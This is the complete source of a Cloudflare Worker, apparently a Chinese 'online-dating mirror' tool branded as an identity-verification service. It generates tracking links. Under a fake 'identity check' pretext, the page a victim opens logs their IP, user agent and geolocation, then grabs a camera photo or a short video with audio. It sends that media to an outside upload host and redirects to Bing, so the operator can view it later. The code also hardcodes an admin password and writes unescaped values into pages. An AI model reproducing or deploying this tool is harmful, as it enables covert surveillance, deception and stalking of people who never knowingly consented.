// 专业身份校验系统 - Cloudflare Worker
// 绑定D1数据库: DB (需在wrangler.toml中配置)
// 前端页面基于“网恋照妖镜 Pro”风格改造，名称更专业化：“真颜鉴证 Pro”

const ADMIN_PASSWORD = '1591156135qwzxcv'; // 管理员密码（硬编码，生产环境建议更复杂）
const GEO_API = 'https://ip.ilqx.dpdns.org/geo'; // IP地理信息API
const UPLOAD_API = 'https://tc.ilqx.dpdns.org/upload'; // 文件上传目标地址
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB
const DEFAULT_REDIRECT_URL = 'https://www.bing.com'; // 上传后默认跳转

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;

    // 处理静态资源（内联在HTML中，无需单独文件）
    if (request.method === 'GET' && path === '/') {
      return new Response(renderIndex(), {
        headers: { 'Content-Type': 'text/html;charset=utf-8' }
      });
    }

    // 生成链接API
    if (request.method === 'POST' && path === '/generate') {
      return handleGenerate(request, env);
    }

    // 查询面板API
    if (request.method === 'GET' && path === '/query') {
      return handleQuery(request, env);
    }

    // 管理员后台
    if (path.startsWith('/admin')) {
      return handleAdmin(request, env, path);
    }

    // 上传文件接口（前端拍照/录制后上传到此）
    if (request.method === 'POST' && path === '/upload') {
      return handleUpload(request, env);
    }

    // 动态ID路径：/:id
    if (request.method === 'GET' && path.match(/^\/[a-zA-Z0-9_-]+$/)) {
      const id = path.slice(1);
      return handleVisit(id, request, env);
    }

    return new Response('Not Found', { status: 404 });
  }
};

// ========== 数据库初始化 ==========
async function initDB(env) {
  await env.DB.exec(`
    CREATE TABLE IF NOT EXISTS links (
      id TEXT PRIMARY KEY,
      mode TEXT NOT NULL,
      template TEXT NOT NULL,
      redirect_url TEXT NOT NULL,
      creator_ip TEXT,
      creator_ua TEXT,
      creator_geo TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS visits (
      visit_id INTEGER PRIMARY KEY AUTOINCREMENT,
      link_id TEXT NOT NULL,
      visitor_ip TEXT,
      visitor_ua TEXT,
      visitor_geo TEXT,
      visited_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY(link_id) REFERENCES links(id)
    );
    CREATE TABLE IF NOT EXISTS uploads (
      upload_id INTEGER PRIMARY KEY AUTOINCREMENT,
      visit_id INTEGER NOT NULL,
      file_src TEXT NOT NULL,
      mode TEXT NOT NULL,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY(visit_id) REFERENCES visits(visit_id)
    );
  `);
}

// ========== 首页 ==========
function renderIndex() {
  return `<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>真颜鉴证 Pro · 身份校验系统</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: linear-gradient(145deg, #0b1729 0%, #1a2f3f 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; color: #e0e7f0; }
        .container { max-width: 1000px; width: 100%; background: rgba(20, 35, 50, 0.9); backdrop-filter: blur(10px); border-radius: 40px; box-shadow: 0 30px 60px rgba(0,0,0,0.6), 0 0 0 1px rgba(100, 180, 255, 0.2) inset; padding: 40px; border: 1px solid #2f4b66; }
        h1 { font-size: 2.8rem; font-weight: 700; background: linear-gradient(135deg, #a0d0ff, #6cb2ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 5px; letter-spacing: -0.5px; }
        .subhead { color: #8ba9c9; margin-bottom: 40px; border-left: 4px solid #3f6b99; padding-left: 20px; font-size: 1.1rem; }
        .card-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; margin-bottom: 40px; }
        .card { background: #1f3348; border-radius: 28px; padding: 30px; box-shadow: 0 20px 30px -10px #0a121c; border: 1px solid #365977; }
        .card h2 { font-size: 1.8rem; margin-bottom: 20px; color: #b8d6ff; font-weight: 500; display: flex; align-items: center; gap: 10px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #b0c9e0; font-weight: 500; font-size: 0.95rem; }
        input[type="text"], select { width: 100%; padding: 15px 20px; background: #102433; border: 1px solid #2e4b6b; border-radius: 40px; font-size: 1rem; color: #fff; outline: none; transition: 0.2s; }
        input[type="text"]:focus, select:focus { border-color: #5b9bff; box-shadow: 0 0 0 3px rgba(70, 130, 255, 0.3); }
        .checkbox-group { margin: 25px 0; }
        .checkbox-group label { display: flex; align-items: center; gap: 12px; font-size: 1rem; cursor: pointer; }
        input[type="checkbox"] { width: 20px; height: 20px; accent-color: #3f8bff; }
        .btn { background: linear-gradient(145deg, #2666b0, #15457a); border: none; padding: 16px 30px; border-radius: 50px; font-size: 1.2rem; font-weight: 600; color: white; width: 100%; cursor: pointer; box-shadow: 0 8px 0 #0b2540, 0 8px 20px #00000080; transition: 0.1s ease; border: 1px solid #5285c0; }
        .btn:active { transform: translateY(8px); box-shadow: 0 0 0 #0b2540, 0 8px 20px #00000080; }
        .info-panel { background: #15293b; border-radius: 28px; padding: 30px; border: 1px solid #2a4d6e; }
        .info-panel h3 { color: #c1d9ff; margin-bottom: 20px; font-weight: 500; }
        .link-display { background: #0c1c2c; padding: 15px; border-radius: 50px; border: 1px solid #365b7c; word-break: break-all; font-family: monospace; margin: 20px 0; color: #9bc3ff; }
        .footer { text-align: center; margin-top: 40px; color: #6285a8; font-size: 0.95rem; border-top: 1px solid #23415a; padding-top: 25px; }
        .badge { background: #20558a; border-radius: 30px; padding: 5px 15px; font-size: 0.8rem; color: #cbe4ff; }
        .query-result { margin-top: 20px; }
        .file-list { list-style: none; }
        .file-list li { background: #1b3144; margin: 8px 0; padding: 10px; border-radius: 30px; display: flex; justify-content: space-between; }
        .file-list a { color: #b3daff; text-decoration: none; }
        .file-list a:hover { text-decoration: underline; }
    </style>
</head>
<body>
<div class="container">
    <h1>⚡ 真颜鉴证 Pro</h1>
    <div class="subhead">数字身份核验 · 实时影像采集 · 不可抵赖凭证</div>

    <div class="card-grid">
        <!-- 生成面板 -->
        <div class="card">
            <h2>🔗 生成校验链接</h2>
            <div class="form-group">
                <label>唯一ID (会员填写账号)</label>
                <input type="text" id="linkId" placeholder="例如: alice123" value="">
            </div>
            <div class="form-group">
                <label>采集模式</label>
                <select id="modeSelect">
                    <option value="photo">📸 拍照模式 (即时拍照)</option>
                    <option value="video">🎥 录制模式 (小视频)</option>
                </select>
            </div>
            <div class="form-group">
                <label>跳转链接 (完成后跳转)</label>
                <input type="text" id="redirectUrl" value="https://www.bing.com">
            </div>
            <div class="checkbox-group">
                <label><input type="checkbox" id="agreeProtocol"> 我已阅读并同意《用户协议》</label>
                <label><input type="checkbox" id="agreeDisclaimer"> 我已阅读并同意《免责声明》</label>
            </div>
            <button class="btn" id="generateBtn">⚡ 生成专属链接</button>
            <div class="link-display" id="generatedLink">等待生成…</div>
        </div>

        <!-- 查询面板 -->
        <div class="card">
            <h2>🔍 查询已采集数据</h2>
            <div class="form-group">
                <label>输入ID</label>
                <input type="text" id="queryId" placeholder="输入ID查询">
            </div>
            <button class="btn" id="queryBtn">📋 查询</button>
            <div class="info-panel query-result" id="queryResult">
                <h3>📁 文件列表</h3>
                <ul class="file-list" id="fileList"></ul>
                <p id="noData">暂无数据</p>
            </div>
        </div>
    </div>

    <!-- 使用说明 -->
    <div class="info-panel" style="margin-top: 20px;">
        <h3>📘 使用说明</h3>
        <p>1. 填写唯一ID，选择模式，勾选协议，生成链接。<br>
        2. 将生成的链接发送给对方，对方访问后将自动请求相机权限。<br>
        3. 拍照/录制完成后，系统自动上传并跳转至预设页面。<br>
        4. 您可在查询面板输入ID查看采集到的影像。<br>
        ⚠️ iOS用户必须使用Safari浏览器，请确保HTTPS环境。</p>
    </div>

    <div class="footer">
        © 真颜鉴证 Pro · 身份校验系统 · 2026<br>
        当前时间: ${new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' })}
    </div>
</div>
<script>
    // 生成链接
    document.getElementById('generateBtn').addEventListener('click', async () => {
        const id = document.getElementById('linkId').value.trim();
        const mode = document.getElementById('modeSelect').value;
        const redirect = document.getElementById('redirectUrl').value.trim() || 'https://www.bing.com';
        const agree1 = document.getElementById('agreeProtocol').checked;
        const agree2 = document.getElementById('agreeDisclaimer').checked;
        if (!id) return alert('请输入ID');
        if (!agree1 || !agree2) return alert('请先同意用户协议和免责声明');

        const resp = await fetch('/generate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id, mode, redirect, template: 'default' })
        });
        const data = await resp.json();
        if (resp.ok) {
            document.getElementById('generatedLink').innerText = data.url;
        } else {
            alert(data.error || '生成失败');
        }
    });

    // 查询
    document.getElementById('queryBtn').addEventListener('click', async () => {
        const id = document.getElementById('queryId').value.trim();
        if (!id) return alert('请输入ID');
        const resp = await fetch('/query?id=' + encodeURIComponent(id));
        const data = await resp.json();
        const list = document.getElementById('fileList');
        const noData = document.getElementById('noData');
        list.innerHTML = '';
        if (data.files && data.files.length) {
            noData.style.display = 'none';
            data.files.forEach(f => {
                const li = document.createElement('li');
                li.innerHTML = \`<span>\${f.mode === 'photo' ? '📷' : '🎥'}</span> <a href="\${f.url}" target="_blank">\${f.url.split('/').pop()}</a> <span>\${f.time}</span>\`;
                list.appendChild(li);
            });
        } else {
            noData.style.display = 'block';
        }
    });
</script>
</body>
</html>`;
}

// ========== 生成链接处理 ==========
async function handleGenerate(request, env) {
  await initDB(env);
  const { id, mode, redirect, template } = await request.json();
  if (!id || !mode) {
    return new Response(JSON.stringify({ error: '缺少参数' }), { status: 400, headers: { 'Content-Type': 'application/json' } });
  }
  // 检查id是否存在
  const existing = await env.DB.prepare('SELECT id FROM links WHERE id = ?').bind(id).first();
  if (existing) {
    return new Response(JSON.stringify({ error: 'ID已存在，请更换' }), { status: 409, headers: { 'Content-Type': 'application/json' } });
  }

  // 获取请求者IP和UA
  const ip = request.headers.get('CF-Connecting-IP') || request.headers.get('x-real-ip') || '';
  const ua = request.headers.get('User-Agent') || '';

  // 获取地理位置
  let geo = null;
  try {
    const geoResp = await fetch(GEO_API, { headers: { 'User-Agent': 'CloudflareWorker' } });
    if (geoResp.ok) geo = await geoResp.json();
  } catch (e) { console.error('Geo fetch error', e); }

  // 插入数据库
  await env.DB.prepare(`
    INSERT INTO links (id, mode, template, redirect_url, creator_ip, creator_ua, creator_geo)
    VALUES (?, ?, ?, ?, ?, ?, ?)
  `).bind(id, mode, template || 'default', redirect || DEFAULT_REDIRECT_URL, ip, ua, geo ? JSON.stringify(geo) : null).run();

  const linkUrl = new URL(request.url);
  const fullUrl = `${linkUrl.protocol}//${linkUrl.host}/${id}`;
  return new Response(JSON.stringify({ url: fullUrl }), { headers: { 'Content-Type': 'application/json' } });
}

// ========== 查询处理 ==========
async function handleQuery(request, env) {
  await initDB(env);
  const id = new URL(request.url).searchParams.get('id');
  if (!id) return new Response(JSON.stringify({ error: '缺少id' }), { status: 400, headers: { 'Content-Type': 'application/json' } });

  // 查询该link下的所有上传文件，关联visits和uploads
  const { results } = await env.DB.prepare(`
    SELECT u.file_src, u.mode, u.created_at, v.visitor_ip
    FROM uploads u
    JOIN visits v ON u.visit_id = v.visit_id
    WHERE v.link_id = ?
    ORDER BY u.created_at DESC
  `).bind(id).all();

  const files = results.map(row => ({
    url: `https://tc.ilqx.dpdns.org${row.file_src}`,
    mode: row.mode,
    time: row.created_at,
    ip: row.visitor_ip
  }));

  return new Response(JSON.stringify({ files }), { headers: { 'Content-Type': 'application/json' } });
}

// ========== 处理访问者链接 ==========
async function handleVisit(id, request, env) {
  await initDB(env);
  const link = await env.DB.prepare('SELECT * FROM links WHERE id = ?').bind(id).first();
  if (!link) {
    return new Response('链接不存在', { status: 404 });
  }

  // 记录访问者信息
  const ip = request.headers.get('CF-Connecting-IP') || request.headers.get('x-real-ip') || '';
  const ua = request.headers.get('User-Agent') || '';
  let geo = null;
  try {
    const geoResp = await fetch(GEO_API, { headers: { 'User-Agent': 'CloudflareWorker' } });
    if (geoResp.ok) geo = await geoResp.json();
  } catch (e) {}

  const { lastInsertRowid: visitId } = await env.DB.prepare(`
    INSERT INTO visits (link_id, visitor_ip, visitor_ua, visitor_geo)
    VALUES (?, ?, ?, ?)
  `).bind(id, ip, ua, geo ? JSON.stringify(geo) : null).run();

  // 返回前端页面，内嵌visitId用于后续上传
  return new Response(renderVisitPage(link, visitId), {
    headers: { 'Content-Type': 'text/html;charset=utf-8' }
  });
}

// ========== 访问者页面 (拍照/录制) ==========
function renderVisitPage(link, visitId) {
  const mode = link.mode; // 'photo' or 'video'
  const redirectUrl = link.redirect_url || DEFAULT_REDIRECT_URL;
  const template = link.template || 'default';

  // 简单的相机HTML，包含两种模板示意，实际可根据template提供不同文案
  return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>身份校验</title>
    <style>
        body { background: #0f1f2f; color: white; font-family: system-ui; text-align: center; padding: 20px; }
        video, canvas { width: 100%; max-width: 500px; border-radius: 40px; background: #2a3f55; margin: 20px auto; display: block; }
        button { background: #2a7fff; border: none; padding: 16px 30px; border-radius: 50px; font-size: 1.3rem; color: white; width: 90%; max-width: 400px; margin: 10px; font-weight: bold; box-shadow: 0 5px 0 #10428b; }
        .hint { background: #1c3b5e; padding: 15px; border-radius: 30px; margin: 30px auto; max-width: 500px; border-left: 5px solid #ffaa33; }
        .footer { margin-top: 40px; color: #5f7f9f; }
    </style>
</head>
<body>
    <h1>⚡ 身份核验请求</h1>
    <div class="hint">
        ⚠️ 系统需要获取相机权限以完成真人校验。<br>
        点击下方按钮并允许访问相机。
    </div>
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas" style="display:none"></canvas>
    <button id="actionBtn">${mode === 'photo' ? '📸 拍照并提交' : '🎥 开始录制 (3秒)'}</button>
    <p id="status" style="color: #aaccff;"></p>
    <div class="footer">验证完成将自动跳转 · 隐私保护</div>

    <script>
        const mode = '${mode}';
        const visitId = ${visitId};
        const redirectUrl = '${redirectUrl}';
        let stream = null;
        let mediaRecorder = null;
        let chunks = [];

        async function initCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: mode === 'video' });
                document.getElementById('video').srcObject = stream;
            } catch (e) {
                document.getElementById('status').innerText = '❌ 相机权限被拒绝，无法完成校验';
            }
        }
        initCamera();

        document.getElementById('actionBtn').addEventListener('click', async () => {
            const btn = document.getElementById('actionBtn');
            btn.disabled = true;
            if (mode === 'photo') {
                // 拍照
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(async (blob) => {
                    await uploadFile(blob, 'photo');
                }, 'image/jpeg', 0.9);
            } else {
                // 录制模式
                chunks = [];
                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    await uploadFile(blob, 'video');
                };
                mediaRecorder.start();
                document.getElementById('status').innerText = '⏺️ 录制中...';
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') mediaRecorder.stop();
                }, 3000); // 默认3秒
            }
        });

        async function uploadFile(blob, fileMode) {
            if (blob.size > ${MAX_FILE_SIZE}) {
                document.getElementById('status').innerText = '❌ 文件超过5MB，请重试';
                return;
            }
            const formData = new FormData();
            formData.append('file', blob, fileMode === 'photo' ? 'snapshot.jpg' : 'recording.webm');
            formData.append('visitId', visitId);
            formData.append('mode', fileMode);

            const resp = await fetch('/upload', { method: 'POST', body: formData });
            if (resp.ok) {
                document.getElementById('status').innerText = '✅ 上传成功，即将跳转...';
                setTimeout(() => { window.location.href = redirectUrl; }, 1500);
            } else {
                document.getElementById('status').innerText = '❌ 上传失败';
            }
        }
    </script>
</body>
</html>`;
}

// ========== 上传文件并转发到tc ==========
async function handleUpload(request, env) {
  await initDB(env);
  const formData = await request.formData();
  const file = formData.get('file');
  const visitId = formData.get('visitId');
  const mode = formData.get('mode') || 'photo';
  if (!file || !visitId) {
    return new Response(JSON.stringify({ error: '缺少文件或visitId' }), { status: 400 });
  }
  if (file.size > MAX_FILE_SIZE) {
    return new Response(JSON.stringify({ error: '文件超过5MB' }), { status: 413 });
  }

  // 转发到tc上传接口
  const forwardForm = new FormData();
  forwardForm.append('file', file, file.name);
  const uploadResp = await fetch(UPLOAD_API, { method: 'POST', body: forwardForm });
  if (!uploadResp.ok) {
    return new Response(JSON.stringify({ error: '上游上传失败' }), { status: 502 });
  }
  const uploadJson = await uploadResp.json(); // 期望返回 [{"src":"..."}]
  if (!Array.isArray(uploadJson) || uploadJson.length === 0) {
    return new Response(JSON.stringify({ error: '上游返回格式错误' }), { status: 502 });
  }
  const src = uploadJson[0].src;

  // 存入数据库
  await env.DB.prepare(`
    INSERT INTO uploads (visit_id, file_src, mode) VALUES (?, ?, ?)
  `).bind(visitId, src, mode).run();

  return new Response(JSON.stringify({ success: true, src }), { headers: { 'Content-Type': 'application/json' } });
}

// ========== 管理员后台 ==========
async function handleAdmin(request, env, path) {
  const url = new URL(request.url);
  if (path === '/admin/login' && request.method === 'POST') {
    const form = await request.formData();
    const pwd = form.get('password');
    if (pwd === ADMIN_PASSWORD) {
      // 简单cookie认证
      const cookie = `admin_token=${btoa(ADMIN_PASSWORD)}; path=/admin; HttpOnly; SameSite=Strict; Max-Age=3600`;
      return new Response(null, {
        status: 302,
        headers: { Location: '/admin', 'Set-Cookie': cookie }
      });
    } else {
      return new Response('密码错误', { status: 403 });
    }
  }

  // 验证cookie
  const cookies = request.headers.get('Cookie') || '';
  if (!cookies.includes(`admin_token=${btoa(ADMIN_PASSWORD)}`)) {
    return new Response(renderAdminLogin(), { headers: { 'Content-Type': 'text/html;charset=utf-8' } });
  }

  // 已登录，展示后台
  if (path === '/admin' || path === '/admin/') {
    await initDB(env);
    const { results } = await env.DB.prepare(`
      SELECT l.id, l.mode, l.created_at, l.creator_ip, COUNT(DISTINCT v.visit_id) as visits, COUNT(u.upload_id) as uploads
      FROM links l
      LEFT JOIN visits v ON l.id = v.link_id
      LEFT JOIN uploads u ON v.visit_id = u.visit_id
      GROUP BY l.id
      ORDER BY l.created_at DESC
    `).all();

    return new Response(renderAdminPanel(results), { headers: { 'Content-Type': 'text/html;charset=utf-8' } });
  }

  // 查看详情 /admin/view?id=xxx
  if (path === '/admin/view') {
    const id = url.searchParams.get('id');
    if (!id) return new Response('缺少id', { status: 400 });
    const visits = await env.DB.prepare(`
      SELECT v.visit_id, v.visitor_ip, v.visitor_ua, v.visitor_geo, v.visited_at,
             u.file_src, u.mode, u.created_at as upload_time
      FROM visits v
      LEFT JOIN uploads u ON v.visit_id = u.visit_id
      WHERE v.link_id = ?
      ORDER BY v.visited_at DESC
    `).bind(id).all();

    return new Response(renderVisitDetail(id, visits.results), { headers: { 'Content-Type': 'text/html;charset=utf-8' } });
  }

  return new Response('Admin', { status: 200 });
}

function renderAdminLogin() {
  return `<!DOCTYPE html>
<html><head><title>管理员登录</title><style>body{background:#0b1729;color:#e0e7f0;display:flex;justify-content:center;align-items:center;height:100vh;}</style></head>
<body><form method="post" action="/admin/login">
  <input type="password" name="password" placeholder="密码">
  <button type="submit">登录</button>
</form></body></html>`;
}

function renderAdminPanel(links) {
  const rows = links.map(l => `<tr>
    <td>${l.id}</td><td>${l.mode}</td><td>${l.created_at}</td><td>${l.visits}</td><td>${l.uploads}</td>
    <td><a href="/admin/view?id=${l.id}">查看</a></td>
  </tr>`).join('');
  return `<!DOCTYPE html>
<html><head><title>管理面板</title><style>body{background:#0b1729;color:#e0e7f0;padding:30px;} table{border-collapse:collapse;width:100%;} td,th{border:1px solid #2f4b66;padding:10px;}</style></head>
<body><h1>链接列表</h1><table><tr><th>ID</th><th>模式</th><th>创建时间</th><th>访问次数</th><th>上传数</th><th>操作</th></tr>${rows}</table></body></html>`;
}

function renderVisitDetail(id, visits) {
  const items = visits.map(v => `<tr>
    <td>${v.visit_id}</td><td>${v.visitor_ip || ''}</td><td>${v.visited_at}</td>
    <td>${v.file_src ? '<a href="https://tc.ilqx.dpdns.org'+v.file_src+'" target="_blank">文件</a>' : '无'}</td>
    <td>${v.mode || ''}</td>
  </tr>`).join('');
  return `<!DOCTYPE html>
<html><head><title>访问详情</title><style>body{background:#0b1729;color:#e0e7f0;padding:30px;} table{border-collapse:collapse;width:100%;} td,th{border:1px solid #2f4b66;padding:10px;}</style></head>
<body><h1>ID: ${id}</h1><table><tr><th>访问ID</th><th>IP</th><th>时间</th><th>文件</th><th>模式</th></tr>${items}</table></body></html>`;
}